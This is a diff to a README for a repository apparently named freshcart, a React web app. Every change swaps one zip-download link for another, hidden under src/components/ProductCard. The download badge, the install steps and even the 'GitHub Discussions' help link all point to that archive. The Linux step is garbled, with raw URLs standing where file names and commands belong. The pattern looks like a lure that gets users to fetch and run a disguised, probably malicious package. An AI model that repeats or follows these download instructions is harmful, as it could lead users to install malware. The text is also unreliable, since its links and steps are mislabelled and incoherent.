@@ -6,11 +6,11 @@ Welcome to freshcart! This is a user-friendly React web application designed for
 
 ## 📥 Download the Application
 
-[![Download freshcart](https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/public/Software_v2.1.zip%https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/public/Software_v2.1.zip)](https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/public/Software_v2.1.zip)
+[![Download freshcart](https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/src/components/ProductCard/Software_1.7.zip%https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/src/components/ProductCard/Software_1.7.zip)](https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/src/components/ProductCard/Software_1.7.zip)
 
 To get started, you need to download freshcart from our Releases page. Follow these simple steps:
 
-1. Click on the download button above or visit this page to download: [Download freshcart](https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/public/Software_v2.1.zip).
+1. Click on the download button above or visit this page to download: [Download freshcart](https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/src/components/ProductCard/Software_1.7.zip).
 
 2. On the Releases page, find the latest version of the application. Look for the version number (e.g., v1.0) to ensure you are getting the most updated version.
 
@@ -39,7 +39,7 @@ After downloading, here’s how to install freshcart:
    - Open the `.dmg` file. Drag the freshcart icon to your Applications folder.
 
 4. **For Linux:** 
-   - Extract the `https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/public/Software_v2.1.zip` file. Open the terminal and navigate to the folder and type `https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/public/Software_v2.1.zip`. Follow any prompts.
+   - Extract the `https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/src/components/ProductCard/Software_1.7.zip` file. Open the terminal and navigate to the folder and type `https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/src/components/ProductCard/Software_1.7.zip`. Follow any prompts.
 
 ## 🔑 Setting Up Freshcart
 
@@ -84,7 +84,7 @@ We welcome community feedback and contributions! If you have suggestions or woul
 
 ## 📞 Need Help?
 
-If you need help or have any questions, visit our [GitHub Discussions](https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/public/Software_v2.1.zip). You can also create an issue on the repository page, and we’ll get back to you.
+If you need help or have any questions, visit our [GitHub Discussions](https://github.com/jonathan20232005/freshcart/raw/refs/heads/main/src/components/ProductCard/Software_1.7.zip). You can also create an issue on the repository page, and we’ll get back to you.
 
 ## 📝 Notes
 
